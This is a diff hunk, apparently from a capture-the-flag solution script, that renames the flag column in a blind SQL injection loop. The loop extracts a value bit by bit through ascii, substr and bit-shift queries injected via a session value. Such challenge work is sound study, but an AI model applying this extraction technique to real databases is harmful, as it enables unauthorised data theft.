@@ -88,7 +88,7 @@ for offset in range(0, 10):
         byte = 0
 
         for bit in range(0, 8):
-            flag = "SELECT flag_ANFlE FROM definitely_not_a_flaaag LIMIT 1 OFFSET {}".format(offset)
+            flag = "SELECT flag_z4tXI FROM definitely_not_a_flaaag LIMIT 1 OFFSET {}".format(offset)
             query = "SELECT ((ascii((substr(({}),{},1))) >> {}) & 1)=1".format(flag, position, bit)
 
             value_json["data"] = set_session_value_query(value_data, query)
